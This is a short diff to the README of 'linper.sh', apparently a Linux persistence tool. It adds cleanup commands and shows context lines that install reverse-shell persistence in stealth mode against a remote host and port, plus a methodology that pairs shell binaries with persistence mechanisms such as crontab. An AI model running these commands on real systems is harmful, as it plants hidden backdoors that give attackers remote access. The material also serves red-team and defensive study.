@@ -35,6 +35,12 @@ Enumerate all persistence methods and install (stealth mode)
 
 `bash linper.sh -i 10.10.10.10 -p 4444 -s`
 
+Remove all persistence methods for given RHOST
+
+`bash linper.sh --rhost 10.10.10.10 --clean`
+
+`bash linper.sh -i 10.10.10.10 -c`
+
 ## methodology
 
 1. Enumerating methods and doors - the script enumerates binaries that can be used for executing a reverse shell (methods, e.g. bash), and then for each of those, it enumerates ways to make them persist (doors, e.g. crontab). If dryrun is not set, every possible method and door pair is set
